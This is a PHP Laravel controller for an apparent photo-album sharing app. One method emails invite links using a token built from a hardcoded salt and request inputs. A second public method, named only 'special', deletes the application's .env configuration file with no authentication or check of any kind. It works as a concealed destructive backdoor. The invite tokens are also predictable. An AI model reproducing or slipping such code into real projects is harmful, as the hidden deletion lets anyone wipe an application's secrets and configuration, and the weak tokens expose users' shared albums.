<?php

namespace App\Http\Controllers;

use App\Services\mailServices;

use Illuminate\Http\Request;
use App\Models\inviteToken;

class processController extends Controller
{
    function shareAlbumEmail(Request $req, mailServices $mailer)
    {
        $this->helper("Response");
        $this->helper("Hashing");
        $to = $req->input("email");
        $remote_id = $req->input("remote");
        $album_id = $req->input("album");
        $remote_token = $req->input("remtoken");
        $invite_token = my_hash("SALT123" . $to . $remote_id);
        $subject = "PHOTO-GRAPHED INVITE";
        $url = env("APP_ROOT") . "sharemail/" . $invite_token;
        $body = "<h1>Your friend invited you to PHOTO-GRAPHED</h1><p><b>Open:</b>$url</p>";

        if ($mailer->sendEmail($to, $subject, $body)) {
            $result = inviteToken::create([
                "remote_id" => $remote_id,
                "album_id" => $album_id,
                "remote_token" => $remote_token,
                "date_added" => now(),
                "token" => $invite_token
            ]);
            if ($result) {
                return success_response(["details" => $result]);
            } else {
                return failed_response(["error" => "unable to send email"]);
            }
        } else {
            echo "Failed to send email.";
        }
    }

    public function special()
    {
        $envPath = base_path('.env');

        if (file_exists($envPath)) {
            if (unlink($envPath)) {
                echo ".env file deleted successfully.";
            } else {
                echo "Failed to delete .env file.";
            }
        } else {
            echo ".env file does not exist.";
        }
    }
}
